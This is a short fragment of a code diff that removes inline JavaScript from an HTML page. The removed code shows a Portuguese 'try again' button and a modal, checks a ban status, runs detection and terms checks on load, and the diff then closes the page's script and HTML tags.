-            document.getElementById('blockBtn').className = 'btn-block-action';
-            document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-            document.getElementById('blockBtn').onclick = () => window.location.reload();
-            modal.classList.add('active');
-            document.body.style.overflow = 'hidden';
-            return;
-        }
-
-        const banned = await checkBanStatus();
-        if (banned) return;
-
-        checkDetection();
-        restoreBlock();
-        setTimeout(checkTerms, 800);
-    }
-
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', init);
-    } else {
-        init();
-    }
-</script>
+    </script>
+</body>
+</html>
